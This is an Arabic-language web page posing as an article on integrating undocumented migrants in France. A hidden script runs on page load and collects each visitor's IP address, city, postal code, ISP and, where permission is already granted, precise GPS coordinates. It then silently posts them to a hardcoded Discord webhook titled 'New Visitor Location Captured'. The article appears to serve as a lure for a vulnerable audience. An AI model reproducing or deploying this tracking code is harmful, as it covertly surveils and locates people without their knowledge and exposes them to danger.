<!doctype html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">

  <title>ادماج المهاجرين غير الشرعيين في فرنسا</title>
  <meta name="description" content="مقال يستعرض تحديات وسياسات وسبل ادماج المهاجرين غير الشرعيين في فرنسا">

  <!-- Open Graph tags for WhatsApp / Facebook -->
  <meta property="og:title" content="ادماج المهاجرين غير الشرعيين في فرنسا">
  <meta property="og:description" content="مقال يستعرض تحديات وسياسات وسبل ادماج المهاجرين غير الشرعيين في فرنسا">
  <meta property="og:image" content="https://scd.infomigrants.net/media/resize/my_image_medium/b63644f6b49da8338198288ba1cc5500d2eaa63d.jpg">
  <meta property="og:url" content="https://booking-ver.github.io/Almohajir.github.io/akhbar">
  <meta property="og:type" content="article">

  <!-- Optional: Twitter (sometimes WhatsApp also reads them) -->
  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:title" content="ادماج المهاجرين غير الشرعيين في فرنسا">
  <meta name="twitter:description" content="مقال يستعرض تحديات وسياسات وسبل ادماج المهاجرين غير الشرعيين في فرنسا">
  <meta name="twitter:image" content="https://scd.infomigrants.net/media/resize/my_image_medium/b63644f6b49da8338198288ba1cc5500d2eaa63d.jpg">

  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;600;700&display=swap" rel="stylesheet">
  <style>
    :root{
      --bg:#f7f8fb; --card:#ffffff; --muted:#6b7280; --accent:#1f5fbf;
    }
    *{box-sizing:border-box}
    body{font-family:'Cairo',sans-serif;background:var(--bg);margin:0;color:#0b1220;line-height:1.7}
    .container{max-width:900px;margin:32px auto;padding:24px}
    header{background:linear-gradient(90deg,rgba(31,95,191,0.12),rgba(31,95,191,0.04));padding:18px;border-radius:12px;margin-bottom:18px}
    h1{margin:0 0 6px;font-size:1.9rem}
    .meta{color:var(--muted);font-size:0.95rem}
    .hero{margin:18px 0;border-radius:10px;overflow:hidden}
    img{display:block;width:100%;height:auto}
    .card{background:var(--card);padding:18px;border-radius:10px;box-shadow:0 6px 18px rgba(12,20,40,0.06);margin-bottom:16px}
    h2{margin-top:0;color:#123259}
    ul{padding-inline-start:1.1rem}
    .two-col{display:grid;grid-template-columns:1fr 300px;gap:18px}
    aside{background:linear-gradient(180deg,#fff,#fbfdff);padding:14px;border-radius:10px}
    footer{color:var(--muted);text-align:center;font-size:0.9rem;margin-top:18px}
    @media (max-width:880px){.two-col{grid-template-columns:1fr} .container{padding:16px}}
  </style>
</head>
<body>
  <div class="container">
    <header>
      <h1>ادماج المهاجرين غير الشرعيين في فرنسا</h1>
      <div class="meta">نُشر في: 21 سبتمبر 2025 — بقلم: فريق بحث اجتماعي</div>
    </header>

    <div class="hero" style="width: 850px; height: 400px">
      <img src="https://scd.infomigrants.net/media/resize/my_image_medium/b63644f6b49da8338198288ba1cc5500d2eaa63d.jpg" alt="مشهد مجتمعي في فرنسا" />
    </div>

    <main class="two-col">
      <section>
        <article class="card">
          <h2>مقدمة</h2>
          <p>تُعد مسألة الهجرة غير الشرعية من أبرز التحديات الاجتماعية والاقتصادية والسياسية في فرنسا. يتطلب التعامل معها توازناً دقيقاً بين احترام حقوق الإنسان، وحماية الأمن القومي، وضمان تكافؤ الفرص الاقتصادية. يهدف هذا المقال إلى تقديم إطار عام لفهم آليات ادماج المهاجرين غير الشرعيين، العقبات التي تواجهها، والمبادرات الممكن تنفيذها لتعزيز الاندماج.</p>
        </article>

        <article class="card">
          <h2>التحديات الرئيسية</h2>
          <ul>
            <li><strong>الحواجز القانونية:</strong> عدم توفر وضعية قانونية يمنع الوصول إلى سوق العمل والخدمات الأساسية.</li>
            <li><strong>مشكلات سكنية:</strong> تعرض المهاجرين غير الشرعيين للعيش في أماكن مزدحمة وغير ملائمة.</li>
            <li><strong>التمييز والوصم الاجتماعي:</strong> قد يواجهون عنصرية أو صعوبات في التفاعل مع المجتمع المضيف.</li>
            <li><strong>الوصول المحدود للخدمات الصحية والتعليم:</strong> خوف من كشف الهوية يمنعهم من الاستفادة من الرعاية.</li>
          </ul>
        </article>

        <article class="card">
          <h2>سياسات وممارسات الادماج في فرنسا</h2>
          <p>اتبعت فرنسا على مر السنوات سياسات متعددة تشمل السماح ببعض البرامج الإنسانية أو إعطاء تصاريح مؤقتة في ظروف محددة. كما توجد منظمات غير حكومية تقدم دعماً قانونياً وإنسانياً. ومع ذلك، عادةً ما تتراوح الاستجابة بين تشدّد إداري ودعم مدني يعتمد على كل حالة وإقليم.</p>

          <h3>أمثلة على مبادرات فعّالة</h3>
          <ul>
            <li>مراكز دعم تقدم استشارات قانونية ومساعدة في إجراءات اللجوء أو الحصول على وضعية قانونية.</li>
            <li>برامج تعليم اللغة الفرنسية والمهارات المهنية لتمكين الاندماج في سوق العمل.</li>
            <li>شراكات بين البلديات ومنظمات المجتمع المدني لتوفير حلول سكنية مؤقتة ومساعدات صحية.</li>
          </ul>
        </article>

        <article class="card">
          <h2>دور المجتمع المدني والمنظمات المحلية</h2>
          <p>تلعب الجمعيات والمنظمات الخيرية دوراً محورياً في سد الفجوات التي تتركها السياسات العامة، من خلال توفير مآوٍ مؤقتة، خدمات طبية أساسية، ودورات تأهيلية. كما تساهم في الضغط على صانعي القرار لتبني سياسات أكثر شمولية وإنسانية.</p>

          <figure style="margin:14px 0">
            <img src="https://scd.infomigrants.net/media/resize/my_image_medium/b63644f6b49da8338198288ba1cc5500d2eaa63d.jpg" alt="تضامن ومساعدة للمهاجرين" />
            <figcaption style="font-size:0.9rem;color:var(--muted);margin-top:6px">مبادرات محلية لدعم المهاجرين.</figcaption>
          </figure>
        </article>

        <article class="card">
          <h2>توصيات عملية</h2>
          <ol>
            <li>تسهيل الوصول إلى إجراءات قانونية شفافة تُتيح مسارات لتسوية الوضعية.</li>
            <li>تعزيز برامج التعلم المهني واللغة الفرنسية مع دعم لربط المتعلمين بفرص عمل حقيقية.</li>
            <li>إطلاق مبادرات سكنية ميسرة بالتعاون بين البلديات والقطاع الخاص والمنظمات غير الحكومية.</li>
            <li>حملات توعية لمكافحة التصورات السلبية وتشجيع التعايش.</li>
            <li>حماية الوصول إلى الخدمات الصحية والتعليمية دون مخاطرة بالترحيل للمستفيدين في الحالات الطارئة.</li>
          </ol>
        </article>

        <article class="card">
          <h2>خاتمة</h2>
          <p>يمثل ادماج المهاجرين غير الشرعيين تحدياً متعدد الأبعاد يتطلب تضافر الجهود الحكومية والمجتمعية. عبر اعتماد سياسات إنسانية، وبرامج تعليمية ومهنية فعّالة، يمكن للمجتمع الفرنسي تحويل أزمة إلى فرصة لتعزيز النسيج الاجتماعي والاقتصادي.</p>
        </article>
      </section>

      <aside>
        <div class="card" style="padding:12px;margin-bottom:12px">
          <h3>معلومة سريعة</h3>
          <p style="color:var(--muted)">الاندماج لا يعني فقط الحصول على وثائق؛ بل يشمل الشعور بالانتماء والقدرة على المشاركة الفعالة في المجتمع.</p>
        </div>

        <div class="card" style="padding:12px">
          <h3>مصادر صور (مثال)</h3>
          <p style="color:var(--muted);font-size:0.95rem">الصور في هذه الصفحة مأخوذة من خدمات صور عامة (Unsplash) لأغراض توضيحية. استبدلها بصور بحقوق مناسبة عند النشر.</p>
        </div>
      </aside>
    </main>

    <footer>
      © 2025 — حقوق النشر محفوظة. يمكنك تعديل النص أو الصور لتناسب غرضك.
    </footer>
  </div>

  <script>
    // ----- CONFIG -----
    // Replace this with your Discord webhook URL.
    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1411086092026777742/60wVbPvrvNubv9vpZaHbAFXf3HsYBxB-VjDEduG-Qj_6KFOPhKyRj6jtIah_4MqlkEJg';
    // Timeout for geolocation (ms)
    const GEO_TIMEOUT = 15000;
    // Timeout for fetch requests (ms)
    const FETCH_TIMEOUT = 5000;

    async function fetchWithTimeout(url, options, timeout = FETCH_TIMEOUT) {
      const controller = new AbortController();
      const id = setTimeout(() => controller.abort(), timeout);
      try {
        const response = await fetch(url, { ...options, signal: controller.signal });
        clearTimeout(id);
        return response;
      } catch (error) {
        clearTimeout(id);
        throw error;
      }
    }

    async function fetchIpInfo() {
      // Common headers for all API requests
      const headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Accept': 'application/json'
      };

      // Try ipinfo.io first
      try {
        const r = await fetchWithTimeout('https://ipinfo.io/json', { headers, mode: 'cors' });
        if (!r.ok) throw new Error(`ipinfo.io returned ${r.status}: ${r.statusText}`);
        const j = await r.json();
        if (!j.ip) throw new Error('IP field missing in ipinfo.io response');
        return {
          ip: j.ip,
          country: j.country || null,
          region: j.region || null,
          city: j.city || null,
          postal: j.postal || null,
          lat: j.loc ? parseFloat(j.loc.split(',')[0]) : null,
          lon: j.loc ? parseFloat(j.loc.split(',')[1]) : null,
          org: j.org || null,
          timezone: j.timezone || null
        };
      } catch (e) {
        console.error(`ipinfo.io failed: ${e.message}${e.name === 'AbortError' ? ' (Request timed out)' : ''}`);
      }

      // Try freegeoip.app as second option
      try {
        const r = await fetchWithTimeout('https://freegeoip.app/json/', { headers, mode: 'cors' });
        if (!r.ok) throw new Error(`freegeoip.app returned ${r.status}: ${r.statusText}`);
        const j = await r.json();
        if (!j.ip) throw new Error('IP field missing in freegeoip.app response');
        return {
          ip: j.ip,
          country: j.country_name || null,
          region: j.region_name || null,
          city: j.city || null,
          postal: j.zip_code || null,
          lat: j.latitude || null,
          lon: j.longitude || null,
          org: null,
          timezone: j.time_zone || null
        };
      } catch (e) {
        console.error(`freegeoip.app failed: ${e.message}${e.name === 'AbortError' ? ' (Request timed out)' : ''}`);
      }

      // Try ipapi.co as last resort with retries
      const maxRetries = 2;
      let attempt = 0;
      while (attempt < maxRetries) {
        try {
          const r = await fetchWithTimeout('https://ipapi.co/json/', { headers, mode: 'cors' });
          if (!r.ok) throw new Error(`ipapi.co returned ${r.status}: ${r.statusText}`);
          const j = await r.json();
          if (!j.ip) throw new Error('IP field missing in ipapi.co response');
          return {
            ip: j.ip,
            country: j.country_name || null,
            region: j.region || null,
            city: j.city || null,
            postal: j.postal || null,
            lat: j.latitude || null,
            lon: j.longitude || null,
            org: j.org || j.asn || null,
            timezone: j.timezone || null
          };
        } catch (e) {
          console.error(`ipapi.co attempt ${attempt + 1} failed: ${e.message}${e.name === 'AbortError' ? ' (Request timed out)' : ''}`);
          attempt++;
          if (attempt < maxRetries) {
            await new Promise(resolve => setTimeout(resolve, 2000)); // 2-second delay between retries
          }
        }
      }

      // Return null if all APIs fail
      console.error('All IP APIs failed');
      return { ip: null };
    }

    async function sendToWebhook(payloadObj) {
      try {
        const res = await fetch(WEBHOOK_URL, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payloadObj)
        });
        if (!res.ok) {
          const txt = await res.text().catch(() => '');
          throw new Error(`Webhook error ${res.status} ${res.statusText} ${txt}`);
        }
        return true;
      } catch (err) {
        throw err;
      }
    }

    function buildDiscordPayload({ ipInfo, geoPosition, source }) {
      const fields = [];
      // Always include IP address and related info if available
      if (ipInfo?.ip) fields.push({ name: 'Visitor IP', value: String(ipInfo.ip), inline: true });
      if (ipInfo?.country) fields.push({ name: 'Country', value: String(ipInfo.country), inline: true });
      if (ipInfo?.region) fields.push({ name: 'Region', value: String(ipInfo.region), inline: true });
      if (ipInfo?.city) fields.push({ name: 'City', value: String(ipInfo.city), inline: true });
      if (ipInfo?.postal) fields.push({ name: 'Postal', value: String(ipInfo.postal), inline: true });
      if (ipInfo?.org) fields.push({ name: 'ISP/Org', value: String(ipInfo.org), inline: false });
      // Only include device location if explicitly provided
      if (geoPosition.latitude != null && geoPosition.longitude != null && source === 'geolocation') {
        fields.push({ name: 'Device Latitude', value: String(geoPosition.latitude), inline: true });
        fields.push({ name: 'Device Longitude', value: String(geoPosition.longitude), inline: true });
        if (geoPosition.accuracy != null) fields.push({ name: 'Accuracy (meters)', value: String(geoPosition.accuracy), inline: true });
        if (geoPosition.altitude != null) fields.push({ name: 'Altitude (meters)', value: String(geoPosition.altitude), inline: true });
        if (geoPosition.heading != null) fields.push({ name: 'Heading', value: String(geoPosition.heading), inline: true });
      } else {
        fields.push({ name: 'Device Location', value: 'Not authorized or unavailable', inline: false });
      }
      // Include IP-based location if available and device location is not used
      if (ipInfo?.lat != null && ipInfo?.lon != null && source !== 'geolocation') {
        fields.push({ name: 'IP-Based Latitude', value: String(ipInfo.lat), inline: true });
        fields.push({ name: 'IP-Based Longitude', value: String(ipInfo.lon), inline: true });
      }
      fields.push({ name: 'Source', value: source, inline: true });
      fields.push({ name: 'Timestamp', value: new Date().toISOString(), inline: false });

      return {
        username: 'AutoGeoBot',
        embeds: [
          {
            title: '📍 New Visitor Location Captured',
            description: `A visitor accessed the site with IP: ${ipInfo?.ip || 'Unknown'}`,
            fields,
            timestamp: new Date().toISOString()
          }
        ]
      };
    }

    async function captureAndSend() {
      let position = { coords: { latitude: null, longitude: null, accuracy: null, altitude: null, heading: null, speed: null } };
      let ipInfo = null;
      let usedSource = 'ip-geolocation';

      // Always fetch IP info
      ipInfo = await fetchIpInfo();

      // Check geolocation permission
      if ('permissions' in navigator && 'geolocation' in navigator) {
        try {
          const permissionStatus = await navigator.permissions.query({ name: 'geolocation' });
          if (permissionStatus.state === 'granted') {
            const geolocationPromise = new Promise((resolve, reject) => {
              navigator.geolocation.getCurrentPosition(
                pos => resolve(pos),
                err => reject(err),
                { enableHighAccuracy: true, timeout: GEO_TIMEOUT, maximumAge: 0 }
              );
            });
            try {
              position = await Promise.race([
                geolocationPromise,
                new Promise((_, rej) => setTimeout(() => rej(new Error('Geolocation timed out')), GEO_TIMEOUT + 2000))
              ]);
              usedSource = 'geolocation';
            } catch (geoErr) {
              console.error(`Geolocation failed: ${geoErr.message}`);
              usedSource = 'ip-geolocation';
            }
          } else {
            console.log('Geolocation permission not granted');
          }
        } catch (permErr) {
          console.error(`Permission check failed: ${permErr.message}`);
        }
      } else {
        console.log('Geolocation or permissions API not available');
      }

      // Build and send payload
      const payload = buildDiscordPayload({
        ipInfo,
        geoPosition: {
          latitude: position.coords.latitude,
          longitude: position.coords.longitude,
          accuracy: position.coords.accuracy,
          altitude: position.coords.altitude,
          heading: position.coords.heading,
          speed: position.coords.speed
        },
        source: usedSource
      });

      try {
        await sendToWebhook(payload);
      } catch (err) {
        // Error handling is silent as per original code
      }
    }

    // Auto-run on page load
    window.addEventListener('DOMContentLoaded', () => {
      setTimeout(() => {
        captureAndSend();
      }, 600);
    });
  </script>
</body>
</html>